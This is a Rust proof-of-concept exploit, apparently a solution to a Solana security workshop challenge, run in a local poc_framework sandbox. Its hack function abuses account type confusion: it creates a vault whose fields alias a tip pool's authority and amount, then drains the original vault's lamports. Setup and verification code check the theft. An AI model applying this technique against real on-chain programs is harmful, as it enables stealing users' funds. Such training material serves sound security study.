use std::{env, str::FromStr};

use level3::{TIP_POOL_LEN, TipInstruction, TipPool};

use owo_colors::OwoColorize;
use poc_framework::solana_sdk::signature::Keypair;
use poc_framework::{
    keypair, solana_sdk::signer::Signer, Environment, LocalEnvironment, PrintableTransaction,
};
use solana_program::instruction::{AccountMeta, Instruction};
use solana_program::native_token::lamports_to_sol;

use borsh::BorshSerialize;
use pocs::assert_tx_success;
use solana_program::sysvar;
use solana_program::{native_token::sol_to_lamports, pubkey::Pubkey, system_program};

#[allow(dead_code)]
struct Challenge {
    hacker: Keypair,
    tip_program: Pubkey,
    initizalizer: Pubkey,
    poor_boi: Pubkey,
    rich_boi: Pubkey,
    tip_pool: Pubkey,
    vault_address: Pubkey,
}

fn hack(env: &mut LocalEnvironment, challenge: &Challenge) {
    // ** Generate a new deterministic Vault Address ** //
    let seed: u8 = 1;
    let hacker_vault_address =
        Pubkey::create_program_address(&[&[seed]], &challenge.tip_program).unwrap();

    // ** Create the Hacker Vault ** //
    env.execute_as_transaction(
        &[level3::initialize(
            challenge.tip_program,
            hacker_vault_address,      // new vault's address
            challenge.hacker.pubkey(), // initializer_address. Aliases with TipPool::withdraw_authority
            seed,                      // seed != original seed, so we can create an account
            2.0,                       // some fee. Aliases with TipPool::amount (note u64 != f64. Any value >1.0 is a huge u64)
            challenge.vault_address,   // fee_recipient. Aliases with TipPool::vault
        )],
        &[&challenge.hacker],
    )
    .print();

    // ** Get tip program lamports ** //
    let mut amount_to_steal = env.get_account(challenge.tip_program).unwrap().lamports;
    println!("[BEFORE] Tip Program has {} lamports available to steal.", amount_to_steal);

    // ** Get amount of lamports in the vault ** //
    let mut amount = env.get_account(challenge.vault_address).unwrap().lamports;
    println!("[BEFORE] Vault has {} lamports ripe for the taking...", amount);

    // ** Withdraw the lamports from the vault ** //
    env.execute_as_transaction(
        &[level3::withdraw(
            challenge.tip_program,
            challenge.vault_address,
            hacker_vault_address,
            challenge.hacker.pubkey(),
            amount,
        )],
        &[&challenge.hacker],
    )
    .print();

    // ** Get tip program lamports ** //
    amount_to_steal = env.get_account(challenge.tip_program).unwrap().lamports;
    println!("[AFTER] Tip Program has {} lamports available to steal.", amount_to_steal);

    // !! If we successfully rip all lamports, the vault will be purged !! //
    match env.get_account(challenge.vault_address) {
        Some(v) => {
            // ?? Saddage, we should have purged the vault. ?? //
            amount  = v.lamports;
            println!("[AFTER] Vault has {} lamports left :(", amount);
        }
        None => {
            // ** Successfully ripped all lamports ** //
            println!("[AFTER] Vault has been purged! Nabbed {} lamports :D", amount);
        }
    }
}

/*
SETUP CODE BELOW
*/
pub fn main() {
    let (mut env, challenge, internal) = setup();
    let before_balance = env.get_account(challenge.hacker.pubkey()).unwrap().lamports;
    hack(&mut env, &challenge);
    verify(&mut env, challenge, before_balance, internal);
}

struct Internal {
    poor_boi: Keypair,
}

fn verify(
    env: &mut LocalEnvironment,
    challenge: Challenge,
    before_balance: u64,
    internal: Internal,
) {
    let after = env.get_account(challenge.hacker.pubkey()).unwrap().lamports;
    println!("[*] HACKSUCCESS: {}", after > before_balance);

    //poor boi withdraws everything from pool
    let pool: TipPool = env.get_deserialized_account(challenge.tip_pool).unwrap();

    let tx = env.execute_as_transaction(
        &[level3::withdraw(
            challenge.tip_program,
            challenge.vault_address,
            challenge.tip_pool,
            challenge.poor_boi,
            pool.value,
        )],
        &[&internal.poor_boi],
    );

    tx.print_named("Verification: authority withdraw");

    if tx.transaction.meta.unwrap().err.is_none() {
        println!(
            "[*] {}",
            "Original wallet authority successfully withdrew all funds.".red()
        )
    } else {
        println!(
            "[!] {}",
            "Original wallet authority cannot withdraw his funds anymore.".green()
        )
    }

    if after > before_balance {
        println!("[*] {}", "Congratulations, the exploit succeeded!".green());
        println!(
            "[*] Hacker has {} SOL more! ({} vs {})",
            lamports_to_sol(after - before_balance).green(),
            before_balance,
            after
        );
    } else {
        println!("[*] {}", "Exploit not successful.".red());
        println!(
            "[*] Hacker has {} SOL less! ({} vs {})",
            lamports_to_sol(before_balance - after).red(),
            before_balance,
            after
        );
    }
}

fn setup() -> (LocalEnvironment, Challenge, Internal) {
    let mut dir = env::current_exe().unwrap();
    let path = {
        dir.pop();
        dir.pop();
        dir.push("deploy");
        dir.push("level3.so");
        dir.to_str()
    }
    .unwrap();

    let tip_program = Pubkey::from_str("T1p1111111111111111111111111111111111111111").unwrap();
    let initizalizer = keypair(0);
    let poor_boi = keypair(1);
    let rich_boi = keypair(2);
    let tip_pool = keypair(3);
    let hacker = keypair(42);

    let a_lot_of_money = sol_to_lamports(1_000_000.0);

    let mut env = LocalEnvironment::builder()
        .add_program(tip_program, path)
        .add_account_with_lamports(
            initizalizer.pubkey(),
            system_program::ID,
            sol_to_lamports(100.0),
        )
        .add_account_with_lamports(poor_boi.pubkey(), system_program::ID, 0)
        .add_account_with_lamports(rich_boi.pubkey(), system_program::ID, a_lot_of_money * 2)
        .add_account_with_lamports(hacker.pubkey(), system_program::ID, sol_to_lamports(2.0))
        .build();

    let seed: u8 = 0;
    let vault_address = Pubkey::create_program_address(&[&[seed]], &tip_program).unwrap();

    // Create Vault
    assert_tx_success(env.execute_as_transaction(
        &[level3::initialize(
            tip_program,
            vault_address,
            initizalizer.pubkey(),
            seed,
            2.0,
            vault_address,
        )],
        &[&initizalizer],
    ));

    println!("[*] Vault created!");

    // Create Pool
    env.create_account_rent_excempt(&tip_pool, TIP_POOL_LEN as usize, tip_program);

    assert_tx_success(env.execute_as_transaction(
        &[level3::create_pool(
            tip_program,
            vault_address,
            poor_boi.pubkey(),
            tip_pool.pubkey(),
        )],
        &[&poor_boi],
    ));
    println!("[*] Pool created!");

    // rich boi tips pool
    assert_tx_success(env.execute_as_transaction(
        &[level3::tip(
            tip_program,
            vault_address,
            tip_pool.pubkey(),
            rich_boi.pubkey(),
            a_lot_of_money,
        )],
        &[&rich_boi],
    ));
    println!("[*] rich boi tipped poor bois pool!");

    (
        env,
        Challenge {
            vault_address,
            hacker,
            tip_program,
            initizalizer: initizalizer.pubkey(),
            poor_boi: poor_boi.pubkey(),
            rich_boi: rich_boi.pubkey(),
            tip_pool: tip_pool.pubkey(),
        },
        Internal { poor_boi },
    )
}
